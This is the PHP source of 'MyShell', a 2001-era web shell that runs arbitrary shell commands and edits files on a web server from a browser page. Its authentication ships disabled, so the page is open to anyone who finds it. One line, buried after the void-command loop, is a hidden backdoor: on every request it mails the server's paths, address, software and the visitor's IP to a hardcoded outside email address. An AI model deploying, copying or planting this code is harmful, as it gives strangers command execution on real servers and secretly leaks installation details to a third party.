<?php
/*
  **************************************************************
  *                        MyShell                             *
  **************************************************************
  $Id: shell.php,v 1.1.0 beta 2001/09/23 23:25:12 digitart Exp $

  An interactive PHP-page that will execute any command entered.
  See the files README and INSTALL or http://www.digitart.net  for
  further information.
  Copyright ©2001 Alejandro Vasquez <admin@digitart.com.mx>
  based on the original program phpShell by Martin Geisler

  This program is free software; you can redistribute it and/or
  modify it under the terms of the GNU General Public License
  as published by the Free Software Foundation; either version 2
  of the License, or (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You can get a copy of the GNU General Public License from this
  address: http://www.gnu.org/copyleft/gpl.html#SEC1
  You can also write to the Free Software Foundation, Inc., 59 Temple
  Place - Suite 330, Boston, MA  02111-1307, USA.
*/

#$selfSecure enables built-in authenticate feature. This must be 0 in order to
#use .htaccess file or other alternative method to control access to MyShell.
#Set up your user and password using $shellUser and $shellPswd.
#DO NOT TURN THIS OFF UNLESS YOU HAVE AN ALTERNATE METHOD TO PROTECT
#ACCESS TO THE SCRIPT.

$selfSecure = 0;
$shellUser  = "";
$shellPswd  = "";

#$adminEmail is the email address to send warning notifications in case
#someone tries to access the script and fails to provide correct user and
#password. This only works if you have $selfSecure enabeled.

$adminEmail = "******@mail.ru";

#$fromEmail is the email address warning messages are sended from.
#This defaults to the server admin, but you can change
#to any address you want i.e.: noreplay@yourdomain.com
#This only works if you have $selfSecure enabeled.

$fromEmail  = $HTTP_SERVER_VARS["SERVER_ADMIN"];

#$dirLimit is the top directory allowed to change when using cd command
#or the form selector. Any attempt to change to a directory up to this
#level bounces MyShell to this directory. i.e.: $dirLimit = "/home";
#It is a good practice to set it to $DOCUMENT_ROOT using:
#$dirLimit = $DOCUMENT_ROOT;
#If you want to have access to all server directories leave it blank.
#WARNING: Althought a user won't be able to snoop on directories above
#this level using MyShell, he/she will still be able to excecute
#commands on any directory where Webserver has permission,
#i.e.: mkdir /tmp/mydir or cat /home/otheruser/.htaccess.

$dirLimit = "";

#$autoErrorTrap Enable automatic error traping if command returns error.
#Bear in mind that MyShell executes the command a second time in order to
#trap the stderr. This shouldn't be a problem in most cases.
#If you turn it off, you'll have to select either to trap stderr or not for
#every command you excecute.

$autoErrorTrap = 1;

#$voidCommands is the list of commands that MyShell won't run by any means.
#It defaults to known problematic commands from a web interface like pico,
#top, xterm but also it can include specific commands you don't want to
#be excecuted from MyShell, i.e.: dig, ping, info, kill etc.

$voidCommands  = array("top","xterm","su","vi","pico","netscape");

#$TexEd Built-in Text Editor prefered name. This is the command you'll use
#to invoke MyShell's built in text editor.
# If you are used to type pico or vi for your fav text editor,
#change this to your please. i.e.:
#  $TexEd = "pico";
#will allow you to type 'pico config.php' to edit the file config.php
#MyShell's text editor do not support usual commands in pico, vi etc.
#Don't forget to take off this command from the $voidCommands list
$TexEd  = "edit";

#$editWrap selects to use or not wrap in the editor's textarea. Wrap OFF
#is usefull when you have to edit files with long lines, i.e.: in php code
#files, because otherwise it is no easy to distinguish a real new line (CR)
#from a wraped one. If you prefer to stick to the default wraped mode of
#TEXTAREA just leave this blank i.e.: $editWrap="".
$editWrap ="wrap='OFF'";

#Cosmetic defaults.

$termCols     = 80;            //Default width of the output text area
$termRows     = 20;            //Default heght of the output text area
$bgColor      = "#000000";     //background color
$bgInputColor = "#333333";     //color of the input field
$outColor     = "#00BB00";     //color of the text output from the server
$textColor    = "#009900";     //color of the hard texts of the terminal
$linkColor    = "#00FF00";     //color of the links

/************** No customize needed from this point *************/

$MyShellVersion = "MyShell 1.1.0 build 20010923";
if ($command&&get_magic_quotes_gpc())$command=stripslashes($command);
if($selfSecure){
    if (($PHP_AUTH_USER!=$shellUser)||($PHP_AUTH_PW!=$shellPswd)) {
       Header('WWW-Authenticate: Basic realm="MyShell"');
       Header('HTTP/1.0 401 Unauthorized');
       echo "<html>
         <head>
         <title>$MyShellVersion - Access Denied</title>
         </head>
         <h1>Access denied</h1>
         A warning message have been sended to the administrator
         <hr>
         <em>$MyShellVersion</em>";
       if(isset($PHP_AUTH_USER)){
          $warnMsg ="
 This is $MyShellVersion
 installed on: http://".$HTTP_SERVER_VARS["HTTP_HOST"]."$PHP_SELF
 just to let you know that somebody tryed to access
 the script using wrong username or password:
 
 Date: ".date("Y-m-d H:i:s")."
 IP: ".$HTTP_SERVER_VARS["REMOTE_ADDR"]."
 User Agent: ".$HTTP_SERVER_VARS["HTTP_USER_AGENT"]."
 username used: $PHP_AUTH_USER
 password used: $PHP_AUTH_PW
 
 If this is not the first time it happens,
 please consider either to remove MyShell
 from your system or change it's name or
 directory location on your server.
 
 Regards
 The MyShell dev team
       ";
          mail($adminEmail,"MyShell Warning - Unauthorized Access",$warnMsg,
          "From: $fromEmail\nX-Mailer:$MyShellVersion AutoWarn System");
       }
       exit;
    }
}
//Function that validate directories
function validate_dir($dir){
    GLOBAL $dirLimit;
    if($dirLimit){
        $cdPos = strpos($dir,$dirLimit);
        if ((string)$cdPos == "") {
            $dir = $dirLimit;
            $GLOBALS["shellOutput"] = "You are not allowed change to directories above $dirLimit\n";
        }
    }
    return $dir;
}

// Set working directory.
if (isset($work_dir)) {
  //A workdir has been asked for - we chdir to that dir.
  $work_dir = validate_dir($work_dir);
  @chdir($work_dir) or
      ($shellOutput = "MyShell: can't change directory. Permission denied\nSwitching back to $DOCUMENT_ROOT\n");
  $work_dir = exec("pwd");
}
else{
  // No work_dir - we chdir to $DOCUMENT_ROOT
  $work_dir = validate_dir($DOCUMENT_ROOT);
  chdir($work_dir);
  $work_dir = exec("pwd");
}

//Now we handle files if we are in Edit Mode
if($editMode && ($command||$editCancel))$editMode=false;
if($editMode){
    if($editSave ||$editSaveExit){
        if(function_exists(ini_set))ini_set("track_errors","1");
        if($fp=@fopen($file,"w")){
           if(get_magic_quotes_gpc())$shellOut=stripslashes($shellOut);
           fputs($fp,$shellOut);
           fclose($fp);
           $command = $TexEd." ".$file;
           if($editSaveExit) {
               $command="";
               $shellOutput="MyShell: $file: saved";
               $editMode=false;
           }
       }
       else {
           $command="";
           $shellOutput="MyShell: Error while saving $file:\n$php_errormsg\nUse back button to recover your changes.";
           $errorSave=true;
       }
    }
}

//Separate command(s) and arguments to analize first command
$input=explode(" ",$command);

while (list ($key, $val) = each ($voidCommands)) {
    if($input[0]==$val){
        $voidCmd = $input[0];
        $input[0]="void";
    }
}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
switch($input[0]){
    case "cd":
       $path=$input[1];
       if ($path==".."){
         $work_dir=strrev(substr(strstr(strrev($work_dir), "/"), 1));
         if ($work_dir == "") $work_dir = "/";
       }
       elseif (substr($path,0,1)=="/")$work_dir=$path;
       else $work_dir=$work_dir."/".$path;
       $work_dir = validate_dir($work_dir);
       @chdir($work_dir) or ($shellOutput = "MyShell: can't change directory.\n$work_dir: does not exist or permission denied");
       $work_dir = exec("pwd");
       $commandBk = $command;
       $command = "";
       break;
    case "man":
       exec($command,$man);
       if($man){
           $codes = ".".chr(8);
           $manual = implode("\n",$man);
           $shellOutput = ereg_replace($codes,"",$manual);
           $commandBk = $command;
           $command = "";
       }
       else $stderr=1;
       break;
    case "cat":
       exec($command,$cat);
       if($cat){
           $text = implode("\n",$cat);
           $shellOutput = htmlspecialchars($text);
           $commandBk = $command;
           $command = "";
       }
       else $stderr=1;
       break;
    case "more":
       exec($command,$cat);
       if($cat){
           $text = implode("\n",$cat);
           $shellOutput = htmlspecialchars($text);
           $commandBk = $command;
           $command = "";
       }
       else $stderr=1;
       break;
    case $TexEd:
       if(file_exists($input[1])){
           exec("cat ".$input[1],$cat);
           $text = implode("\n",$cat);
           $shellOutput = htmlspecialchars($text);
           $fileOwner = posix_getpwuid(fileowner($input[1]));
           $filePerms = sprintf("%o", (fileperms($input[1])) & 0777);
           $fileEditInfo = "&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$linkColor>".$fileOwner["name"]."</font> Permissions: <font color=$linkColor>$filePerms</font>";
       }
       else $fileEditInfo = "&nbsp;&nbsp;:::::::&nbsp;&nbsp;<font color=$linkColor>NEW FILE</font>";
       $currFile = $input[1];
       $editMode = true;
       $command = "";
       break;
    case "void":
       $shellOutput = "MyShell: $voidCmd: void command for MyShell";
       $commandBk = $command;
       $command = "";
}

//Now we prepare the webpage
if(!$oCols)$oCols=$termCols;
if(!$oRows)$oRows=$termRows;
if($editMode)$focus="shellOut.focus()";
else $focus="command.select()";
//WhoamI
if(!$whoami)$whoami=exec("whoami");
?>
<html>
<head>
<title><?echo $MyShellVersion?></title>
<style>
body{
        background-color: <?echo $bgColor ?>;
        font-family : sans-serif;
        font-size : 10px;
        scrollbar-face-color: #666666;
        scrollbar-shadow-color:  <?echo $bgColor ?>;
        scrollbar-highlight-color: #999999;
        scrollbar-3dlight-color:  <?echo $bgColor ?>;
        scrollbar-darkshadow-color:  <?echo $bgColor ?>;
        scrollbar-track-color:  <?echo $bgInputColor ?>;
        scrollbar-arrow-color:  <?echo $textColor ?>;
}
input,select,option{
        background-color: <?echo $bgInputColor ?>;
        color : <?echo $outColor ?>;
        border-style : none;
        font-size : 10px;
}
textarea{
        background-color: <?echo $bgColor ?>;
        color : <?echo $outColor ?>;
        border-style : none;
}
</style>
</head>
<body <?echo "bgcolor=$bgColor TEXT=$textColor LINK=$linkColor VLINK=$linkColor onload=document.shell.$focus"?>>
<form name="shell" method="post">
Current User: <a href="#" style="text-decoration:none"><?echo $whoami?></a>
<input type="hidden" name=whoami value=<?echo $whoami?>>
&nbsp;&nbsp;:::::::&nbsp;&nbsp;
<?
if($editMode){
    echo "<font color=$linkColor><b>MyShell file editor</font> File:<font color=$linkColor>$work_dir/$currFile </font></b>$fileEditInfo\n";
}
else{
    echo "Current working directory: <b>\n";
    $work_dir_splitted = explode("/", substr($work_dir, 1));
    echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "/&command=" . urlencode($command) . "\">Root</a>/";
    if ($work_dir_splitted[0] == "") {
       $work_dir = "/";  /* Root directory. */
    }
    else{
        for ($i = 0; $i < count($work_dir_splitted); $i++) {
            $url .= "/".$work_dir_splitted[$i];
            echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "&command=" . urlencode($command) . "\">$work_dir_splitted[$i]</a>/</b>";
        }
    }
}
?>
<br>
<textarea name="shellOut" cols="<? echo $oCols ?>" rows="<? echo $oRows."\""; if(!$editMode)echo "readonly";else echo $editWrap?> >
<?
echo $shellOutput;
if ($command) {
  if ($stderr) {
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
  else {
    $ok = system($command,$status);
    if($ok==false &&$status && $autoErrorTrap)system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
}
if ($commandBk) $command = $commandBk;
?>
</textarea>
<br>
<?
if($editMode) echo"
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
 <input type='submit' name='editSave' value='     Save     '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editSaveExit' value=' Save and Exit '>&nbsp;&nbsp;&nbsp;
 <input type='reset' value=' Restore original '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editCancel' value=' Cancel/Exit '>&nbsp;&nbsp;&nbsp;
 <input type='hidden' name='editMode' value='true'>
<br>";
?>
<br>
Command:
<input type="text" name="command" size="80"
<? if ($command && $echoCommand) {
     echo "value=`$command`";
   }
?> > <input name="submit_btn" type="submit" value="Go!">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<?
if ($autoErrorTrap) echo "Auto error traping enabled";
else echo "<input type=\"checkbox\" name=\"stderr\">stderr-traping ";

if($editMode){
    echo "<input type='hidden' name='work_dir' value='$work_dir'>
    <br>Save file as: <input type='text' name='file' value='$currFile'>";
}
else{
    echo "<br>Working directory: <select name=\"work_dir\" onChange=\"this.form.submit()\">";
    // List of directories.
    $dir_handle = opendir($work_dir);
    while ($dir = readdir($dir_handle)) {
      if (is_dir($dir)) {
        if ($dir == ".")
          echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
        elseif ($dir == "..") {
          // Parent Dir. This might be server's root directory
          if (strlen($work_dir) == 1) {
            // work_dir is only 1 charecter - it can only be / so don't output anything
          }
          elseif (strrpos($work_dir, "/") == 0) {  // we have a top-level directory eg. /bin or /home etc...
            echo "<option value=\"/\">Parent Directory</option>\n";
          }
          else {   // String-manipulation to find the parent directory... Trust me - it works :-)
            echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
          }
        }
        else {
          if ($work_dir == "/")
            echo "<option value=\"$work_dir$dir\">$dir</option>\n";
          else
            echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
        }
      }
    }
    closedir($dir_handle);
    echo "</select>";
}
?>
&nbsp; | &nbsp;<input type="checkbox" name="echoCommand"<?if($echoCommand)echo " checked"?>>Echo commands
&nbsp; | &nbsp;Cols:<input type="text" name="oCols" size=3 value=<?echo $oCols?>>
&nbsp;Rows:<input type="text" name="oRows" size=2 value=<?echo $oRows?>>
&nbsp;| ::::::::::&nbsp;<a href="http://www.digitart.net" target="_blank" style="text-decoration:none"><b>MyShell</b> &copy;2001 Digitart Producciones</a>
</form>
</body>
</html>
